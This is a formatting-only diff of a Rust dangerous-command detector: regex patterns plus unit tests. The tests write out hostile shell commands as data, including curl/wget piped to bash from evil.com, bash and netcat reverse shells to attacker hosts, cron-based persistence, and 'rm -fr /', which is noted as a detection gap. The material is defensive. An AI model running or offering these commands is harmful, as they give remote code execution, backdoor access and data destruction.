@@ -103,7 +103,6 @@ static DANGEROUS_PATTERNS: Lazy<Vec<DangerousPattern>> = Lazy::new(|| {
             r"(?i)chmod\s+0{3,4}\b",
             Severity::Medium,
         ),
-
         // === Remote Script Execution ===
         DangerousPattern::new(
             "curl_pipe_shell",
@@ -123,7 +122,6 @@ static DANGEROUS_PATTERNS: Lazy<Vec<DangerousPattern>> = Lazy::new(|| {
             r"(?i)powershell.*DownloadString.*Invoke-Expression",
             Severity::High,
         ),
-
         // === Disk/Filesystem Operations ===
         DangerousPattern::new(
             "mkfs",
@@ -137,7 +135,6 @@ static DANGEROUS_PATTERNS: Lazy<Vec<DangerousPattern>> = Lazy::new(|| {
             r"(?i)dd\s+if=\/dev\/(?:zero|null)",
             Severity::High,
         ),
-
         // === Code Obfuscation & Eval Patterns ===
         DangerousPattern::new(
             "base64_decode",
@@ -205,7 +202,6 @@ static DANGEROUS_PATTERNS: Lazy<Vec<DangerousPattern>> = Lazy::new(|| {
             r"(?i)exec\s*\(+",
             Severity::Medium,
         ),
-
         // === Reverse Shells & Network Access ===
         DangerousPattern::new(
             "netcat_reverse",
@@ -307,7 +303,9 @@ mod tests {
     #[test]
     fn test_curl_pipe_bash_detection() {
         assert!(has_high_severity_pattern("curl http://evil.com | bash"));
-        assert!(has_high_severity_pattern("wget http://evil.com/script.sh | sh"));
+        assert!(has_high_severity_pattern(
+            "wget http://evil.com/script.sh | sh"
+        ));
         assert!(has_high_severity_pattern("curl -s http://x.com/s | zsh"));
         assert!(!has_high_severity_pattern("curl http://api.com"));
     }
@@ -315,7 +313,9 @@ mod tests {
     #[test]
     fn test_reverse_shell_detection() {
         assert!(has_high_severity_pattern("nc 192.168.1.1 4444 -e /bin/sh"));
-        assert!(has_high_severity_pattern("bash -i >& /dev/tcp/1.2.3.4/8080"));
+        assert!(has_high_severity_pattern(
+            "bash -i >& /dev/tcp/1.2.3.4/8080"
+        ));
         assert!(has_high_severity_pattern("/dev/tcp/attacker.com/443"));
     }
 
@@ -336,7 +336,9 @@ mod tests {
     #[test]
     fn test_docker_privileged() {
         assert!(has_high_severity_pattern("docker run --privileged ubuntu"));
-        assert!(has_high_severity_pattern("docker exec --privileged=true container"));
+        assert!(has_high_severity_pattern(
+            "docker exec --privileged=true container"
+        ));
         // Note: our simplified pattern would still match --privileged=false
         // because Rust regex doesn't support negative lookahead.
         // The full safety check should handle this edge case.
@@ -391,12 +393,12 @@ mod tests {
         // Various ways to pipe remote content to shell
         let dangerous = [
             "curl http://evil.com | bash",
-            "curl http://evil.com|bash",           // no spaces
+            "curl http://evil.com|bash", // no spaces
             "curl http://evil.com | sh",
-            "curl -s http://evil.com | bash",      // silent mode
-            "curl -sL http://evil.com | bash",     // follow redirects
+            "curl -s http://evil.com | bash",  // silent mode
+            "curl -sL http://evil.com | bash", // follow redirects
             "wget http://evil.com/s | bash",
-            "wget -q http://evil.com/s | sh",      // quiet mode
+            "wget -q http://evil.com/s | sh", // quiet mode
             "curl http://evil.com | zsh",
         ];
         for cmd in dangerous {
@@ -497,10 +499,10 @@ mod tests {
     fn test_crontab_persistence() {
         // Patterns that ARE detected
         let detected = [
-            "crontab -e",                           // interactive edit
-            "echo 'job' > /var/spool/cron/root",    // writing to cron spool
-            "cp script /etc/cron.d/backdoor",       // cron.d directory
-            "cp script /etc/cron.daily/job",        // cron.daily
+            "crontab -e",                        // interactive edit
+            "echo 'job' > /var/spool/cron/root", // writing to cron spool
+            "cp script /etc/cron.d/backdoor",    // cron.d directory
+            "cp script /etc/cron.daily/job",     // cron.daily
         ];
         for cmd in detected {
             let matches = check_dangerous_patterns(cmd);
@@ -527,13 +529,13 @@ mod tests {
     fn test_false_positives_avoided() {
         // These should NOT trigger high severity patterns
         let safe = [
-            "curl http://api.example.com",         // curl without pipe to shell
-            "wget http://example.com/file.zip",    // wget without pipe
-            "docker run ubuntu echo hello",        // docker without --privileged
-            "base64 file.txt",                     // base64 encoding, not decoding to shell
-            "rm file.txt",                         // rm without -rf /
-            "ls -la",                              // simple command
-            "git status",                          // git status
+            "curl http://api.example.com",      // curl without pipe to shell
+            "wget http://example.com/file.zip", // wget without pipe
+            "docker run ubuntu echo hello",     // docker without --privileged
+            "base64 file.txt",                  // base64 encoding, not decoding to shell
+            "rm file.txt",                      // rm without -rf /
+            "ls -la",                           // simple command
+            "git status",                       // git status
         ];
         for cmd in safe {
             assert!(
@@ -610,8 +612,8 @@ mod tests {
         // The current regex is: r"(?i)\brm\s+-[^\n]*-?r[^\n]*-?f[^\n]*\s+..."
         // which requires -r before -f
         let _known_gaps = [
-            "rm -fr /",           // different flag order - NOT detected
-            "rm -r -f /",         // separate flags - NOT detected
+            "rm -fr /",   // different flag order - NOT detected
+            "rm -r -f /", // separate flags - NOT detected
         ];
     }
 }
